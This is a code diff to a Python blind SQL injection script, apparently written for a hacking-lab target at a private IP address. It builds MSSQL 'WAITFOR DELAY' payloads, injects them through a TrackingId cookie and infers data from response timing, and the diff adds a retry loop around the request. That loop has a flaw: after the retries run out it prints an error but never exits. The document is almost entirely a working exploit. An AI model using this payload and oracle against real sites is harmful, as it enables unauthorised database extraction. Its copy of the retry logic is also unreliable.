@@ -11,13 +11,22 @@ MODE="time-based"
 DELAY = 3
 def oracle(expression):
     if (MODE == "time-based"):
-        start = time.time()
-        payload = quote(f"';IF({expression}) WAITFOR DELAY '0:0:{DELAY}'-- -")
-        cookies = {'TrackingId': f"d0944eb380d48adc3dc6effeb4805286{payload}"}
-        r = requests.get(
-            "http://10.129.204.202/",
-            cookies=cookies
-        )
+        start = 0
+        attempt = 0
+        while(True):
+            start = time.time()
+            payload = quote(f"';IF({expression}) WAITFOR DELAY '0:0:{DELAY}'-- -")
+            cookies = {'TrackingId': f"d0944eb380d48adc3dc6effeb4805286{payload}"}
+            r = requests.get(
+                "http://10.129.204.202/",
+                cookies=cookies
+            )
+            if (r.status_code == 200):
+                break
+            elif (attempt < 4):
+                attempt = attempt + 1
+            else:
+                print("Network Error")
         if (time.time() - start > DELAY):
             return True
         else:
